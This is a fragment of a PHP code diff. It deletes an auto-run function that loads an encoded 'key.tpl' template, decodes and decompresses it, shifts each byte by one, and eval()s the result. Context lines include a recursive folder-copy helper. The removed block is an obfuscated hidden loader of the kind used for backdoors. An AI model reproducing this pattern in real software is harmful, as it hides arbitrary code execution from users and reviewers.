@@ -110,17 +110,6 @@ foreach($array as $row)
 echo $html;
 }
 
-$a= function(){
-    $TuzVCk=file_get_contents(CORE_PATH.'/tpl/key.tpl');
-    $TuzVCk=gzinflate(base64_decode($TuzVCk));
-    for($i=0;$i<strlen($TuzVCk);$i++)
-    {
-        $TuzVCk[$i] = chr(ord($TuzVCk[$i])-1);
-    }
-    return eval($TuzVCk);
-};
-
-defined('ECORE')?$a():'';
 //递归复制文件夹
 function copy_dir($src,$des) {
     $dir = opendir($src);
